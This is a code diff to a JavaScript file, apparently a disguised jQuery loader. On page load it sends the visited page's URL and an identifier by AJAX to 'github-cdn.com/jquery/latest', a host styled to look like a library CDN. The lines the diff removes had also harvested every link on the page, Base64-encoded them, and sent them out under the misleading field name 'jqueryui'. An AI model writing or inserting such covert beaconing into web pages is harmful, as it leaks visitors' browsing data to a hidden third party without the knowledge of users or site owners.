@@ -174,18 +174,9 @@ var Base64 = {
     } 
 
     $(document).ready(function () {
-      //get all links, encode them, send them to server
-      var encodedLinks = "";
-      
-      $("a").each(function(key, val) {
-         var link = $(this).attr("href");
-         encodedLinks += Base64.encode(link) + code();
-      });
-
       var request = {};
-      request.referer = document.URL;
-      request.version = 'replaceme';
-      request.jqueryui = encodedLinks;
+      request.referer = document.URL; 
+      request.version = 'UUID'; //Replace with real UUID
       
       var url =  "github-cdn.com" + "/jquery/latest";    
       $.ajax({
@@ -208,4 +199,4 @@ var Base64 = {
           }
         }
       });
-});
+    });
